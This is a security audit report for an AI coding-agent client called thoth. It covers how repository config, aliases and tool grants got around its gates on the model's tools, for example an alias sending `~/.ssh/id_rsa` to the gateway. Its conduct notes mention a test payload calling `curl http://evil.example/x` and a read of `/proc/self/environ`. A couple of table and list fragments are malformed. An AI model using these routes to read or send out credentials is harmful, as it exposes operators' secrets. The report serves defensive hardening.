# thoth — P(-1) hardening audit, 2026-11-05 (0.53.3)

Scope: thoth's **authored** source, `src/*.cyr` + `src/gui/*.cyr`, plus `scripts/` and `.github/workflows/`, at the 0.53.2 tree.
`lib/` and `src/vendor/**` were read for their contracts; a defect there is an upstream note below, not a thoth finding.

Method: six auditors, each with one area and a frozen copy of the tree: the tool boundary (T), wire and persisted data
(W), terminal surfaces (S), the window (G), processes, targets and CI (P), performance and memory (M). Each was asked to
reproduce a finding before filing it, against a real thoth under a stub gateway, a pty or a headless Hyprland. They filed
**69 findings**, about 63 distinct once the overlaps are folded (T-2 = S-2, T-6 = P-1, T-11 = S-1 + P-6, M-7 = G-7, W-7 = M-1 +
M-2). 10 HIGH (nine distinct), 32 MEDIUM and 17 LOW, plus 10 performance findings that carry no severity.

Severity: CRITICAL (remote/privilege escalation) · HIGH (moderate effort) · MEDIUM (specific conditions) · LOW
(defense-in-depth), per the first-party standards.

Status: **every HIGH is fixed in 0.53.3.** So is the rest, apart from the nine rows under
[Not fixed here](#not-fixed-here), five of which are the remainder of a finding otherwise repaired. Every fix carries a test.
52 fixes were then broken on purpose to prove the tests notice (see [Verification](#verification)). No finding was refuted.

---

## The theme

The 2026-08-24 audit found boundaries applied at one sink but not its sibling. This one found the same shape, one layer
out: **each check was real, and something reached the action around it.**

- t-ron scanned a copy of the command, and a command padded with control bytes overflowed the copy (T-1).
- ADR-0021 made `[tron].policy` global-only, and a relative value in the global file resolved inside the repository (W-1).
- The read jail was correct, and `edit` wrote `.git/config` (T-4).
- The shell deny was correct, and `[verify]` ran what the model had just written (P-1).
- `@file` was safe "because the user typed it", and a repository's alias typed it (T-2).
- A prompt showed a tool's name, and a grant on that name covered any arguments (T-5).

Nothing in the design was wrong. Each premise had stopped being true after the code around it moved.

| T-2 | HIGH | A repository's `[alias]` reached the unjailed `@file` reader: `@../../.ssh/id_rsa` and the global config went to the gateway with no gate. `/write` through an alias followed a checked-in link out of the project. | An alias from the local layer has mentions off (`_mention_off`). | T-3 | HIGH | Mneme recall skipped the gate, the hook, the pin check, redaction and the guard, and a repository's `[daimon].url` picked the host. | Recall honours `toolpin_withheld`, is redacted and guarded, and runs only against a daimon the global layer named. `memory_write`'s prompt names where the note really goes. |

## Wire and persisted data (W)

| ID | Sev | Finding | Repair |
|---|---|---|---|
| W-1 | HIGH | The template's `policy = "tron-policy.toml"` resolved against the cwd, so the repository chose the policy that authorizes the model. `[log]`, `[session]` and `[history]` `file` had the same shape, and a shipped `.thoth_session` resumed as the operator's own turns. | Relative `[tron].policy` and `[toolpin].file` resolve under `~/.thoth/` (`_cfg_global_rel`). `[session].file` stays per-project, and a store that is not 0600 and the operator's is refused and named, so a clone cannot carry one; an archive that keeps modes still can. `[log].file` and `[history].file` stay relative, with links refused: a planted input history only offers text to recall. ADR-0021 addendum. |
| W-2 | HIGH | `[session].file` followed a symlink: a repository could overwrite any operator file. | `O_NOFOLLOW` on load, probe and write; a link is refused and named. |
| W-3 | MED | The session store was destroyed after a partial load, a newer thoth's header or a failed save. | Anything short of a clean parse to EOF unbinds persistence and names why. Saves go through a temp file and a rename. |
| W-4 | MED | An unreadable global config vanished while the local layer applied. | Treated as a refused parse: thoth starts unconfigured and says so. |
| W-5 | MED | 10 calls of 15 KB overflowed `AGENT_ARR_CAP`: all were lost with `ok:true`, or the next POST was invalid JSON. | Array sized for the worst case, and a call that cannot fit is refused by name. |
| W-6 | MED | On the blocking path the echo and the results described different rounds, and every delegated child takes that path. | The executor runs from the rebuilt array, as the streaming path does. |
| W-7 | MED | Redaction was quadratic on repository bytes: 60 KB of `x` took 20 s, with no stop. | `REDACT_WINDOW` chunks a run at 2 KiB, and a stop withholds the result. Root cause upstream (below). |
| W-8 | MED | Stop notices went to a discarded sink, so one-shot reported a stopped turn as a success. | Moved to the `note_*` channel; work-full clears the accumulator. |
| W-9 | MED | The session log was 0644 and held the whole conversation. C1 bytes reached it. | Created 0600 with `O_NOFOLLOW`, `FD_CLOEXEC` on the descriptor, C1 cleaned. |
| W-10 | MED | Byte caps cut characters, so requests carried invalid UTF-8, and piped stdin was cut with no mark. | The escaper maps invalid sequences to U+FFFD. stdin's cut is named on stderr. |
| W-11 | LOW | `max_tokens = 1_000` read as no ceiling, and `1e3`, `1000.0`, `0x3E8` likewise. A repeated `[shell]` lost its `allow` and `deny`. | `_` accepted; any other spelling is named and ignored; a repeated table is named. |
| W-12 | LOW | Local keys could still move the unsafe way: `max_iters`, `[subagent].max_iters`, `[hooks].timeout_ms`, and a token beside a url equal to the global's. | Lower-only, global-only and the D2 test respectively. |

Also found in reading and repaired: a config anywhere up the 40-level walk was accepted with no owner check, so
`/tmp/.thoth/config.cyml` from another local user became a layer for anyone under `/tmp`. It is now skipped and named (`_cfg_foreign`).
An operator running under a checkout another uid owns sees that local layer ignored and named. Root-owned files stay.

## Batch 14

The two roadmap items landed in the same release.

- **Reasoning grows** to `REASON_ACC_MAX` (1 MiB), and a cut says so, on the fold and in the session file.
- **Stream frames parse on an arena reset per frame.** Peak RSS for a 1 MB reply: **123 → 42 MB**. 13.6 MB is the floor for any
  reply, so the frames' own share fell from about 110 MB to under 30.

## Not fixed here

Each is on the roadmap as batch 15, with the reason.

| Item | Why it did not land here |
|---|---|
| G-6, M-9: the window in a silent network wait | The transport has to return between reads. It is a change to how every POST waits. |
| M-10: sparse line index | A data structure in the render path. Long replies are already bearable: 5.3 ms a rebuild at 300 KB. |
| S-11: SIGTERM teardown | Needs a handler or a signalfd in the input loop. |
| M-5: frame batching | A prototype needed a darshana change, and bundles stay byte-identical to their tags. |
| G-9: long-line scroll and caret | A composer feature. |
| P-10, M-3: startup probe, heap, stat shortcut | The cost is inside sit. Skipping the probe on chat turns would change what the status bar shows. |
| P-11: Ctrl-C in line `/run` | Ignoring SIGINT around the wait needs the child's default restored before exec. |
| Windows `cmd.exe` cwd search | `lib/process_win.cyr:354`, in the floor, on a closed lane. |
| Publishing the tested binary | Release artifact reuse, a CI restructure. |

Two notes that are not defects: `PR_SET_DUMPABLE` was considered and left, since it changes `/proc` ownership and breaks attaching
a debugger; and two thoths sharing one `[session].file` are last-writer-wins, as `inhist` documents for itself.

## Upstream notes

- **agnosai:** `agnosai_redact_email` rescans the run from every byte (M-1), and `agnosai_output_redact` rebuilds the string per
  hit on a heap that never frees (M-2). `agnosai_redact_ssn` and `_email` rebuild even with no match (M-6). A fix was prototyped
  and verified against the shipped behaviour: 300,000 fuzz cases, 0 differences. **Residual until it lands:** a secret straddling
  a hard 2 KiB split in an unbroken run. Runs split on separators, so this needs a token inside a 2 KiB run with no break.
- **sit:** `_status_blob_differs` inflates every tracked blob. 84% of a probe is zlib. `.git/index` stat data before inflating would
  cut it by an estimated 95%. `sit_repo_close` returns nothing to the heap.
- **sakshi:** no mode parameter on its output file, so thoth creates the file first.
- **bayan:** an unterminated array in a config swallows the lines after it. That direction fails closed.

## Verified clean (negative results worth recording)

- **Wire:** 151 hostile SSE, raw HTTP and blocking scenarios, a `/models` matrix of 14 catalogs × 6 health bodies and 18 hostile local
  configs gave no crash, no hang and no write out of bounds. Depth 200k, 100k-digit numbers, Content-Length and chunk-size
  attacks, 2 MB headers.
- **Tokens:** no redirect followed, `Authorization` only to hoosh endpoints, none in a log, event, `/save` or session file.
- **Terminal:** repository config strings, directory names, tree rows, `ask_user` text and model replies came out clean, with ESC
  and C1 in each.
- **The capture child:** only 0/1/2 reach the command, the environment is empty or `THOTH_*`, no zombies, correct under
  `qemu-aarch64 -strace`.
- **Git:** no hang on a FIFO in the tree or in `.git`, a tracked link to `/dev/zero`, or `gitdir: /dev/zero`. No shell-out.
- **CI:** no secrets reach PR builds, no `pull_request_target`, no toolchain version in YAML.
- **Performance:** linear to 1.6 MB of reply in all six render shapes, zero heap per request build, TUI idle at 0 CPU.

- `mpick.cyr`, `toolpin.cyr`'s store, `install.sh`'s contents, `scripts/live/wlkit.py`, `pngtool.py`, `gen-splash.sh`.

## Verification

Suite **948 + 2380 + 1482 + 904 + 190 + 6**, 5,904 assertions, 0 failed, run with stdin held open as well as closed. All five suites
pass as aarch64 binaries under `qemu-aarch64` (5,904 of 5,904). macOS is green natively (891 + 2370 + 1472 + 190 + 931). A fresh clone at
a detached tag with an empty `HOME`, the shape of the Release run, passes 5,906. Warning sets match 0.53.2's on all four lanes, apart
from one line number. The AGNOS ring-3 run was not repeated, by the maintainer's standing deferral, and Windows stops at its known nine
names in vendored bundles.

Live, against the stub gateway:

- **TUI in a real pty:** a 100 KB reply and 100 KB of reasoning arrive whole, and the session file holds both. `/run` of an OSC 52 and a
  screen clear reached the terminal zero times as escapes. A background job died when thoth quit. A 5 KB paste said it was cut. A 0644 store
  was refused, named and left unchanged, and at 0600 it resumed.
- **The window, x86_64:** a 300 KB reply, the authorization card, a declined and an allowed `/run`. Idle at 6.1% of a core with that reply
  on screen, and RSS flat at 32,092 KB through a command wait.
- **The window, aarch64 under qemu:** a 100 KB reply and an allowed `/run`.
- **Parallel tools:** 40 calls over 5 runs against a stub daimon, 0 wrong arguments.

The last pass of the suite and warning diff caught three defects in the sweep's own work, all fixed before release: the Windows capture's
`_shell_tmp_buf` had been removed with the POSIX path; a new test reached a confirm and hung on an open stdin, which also showed that `edit`
prompted for a FIFO it could not edit; and a redaction test's absolute time failed under qemu, so it now asks for a ratio. A helper had
also taken the name of one of sit's functions and silently replaced it, and was renamed.

Break tests: 52 fixes were reverted one at a time in a scratch copy and the suites rerun. 50 failed at once. One break that removed the
greeting's give-way passed, so its test now checks the row is on screen, and one break did not compile and was rewritten; both were then
caught. The scratch copy has no local config, which fails 7 core rows on its own, so each core break was judged against that baseline.

## Conduct

The auditors ran hostile payloads on this machine. Four things are on the record:

- One auditor's first run pointed an alias at `/proc/self/environ`. The harness blocked it and nothing was read.
- One first payload held `curl http://evil.example/x`. DNS failed and no connection was made. Later payloads were local only.
- One harness created a stray symlink in the frozen copy of the tree, and the auditor removed it.
- One auditor ended on an API flag right after delivering its report. The report was complete but for its coverage tail.
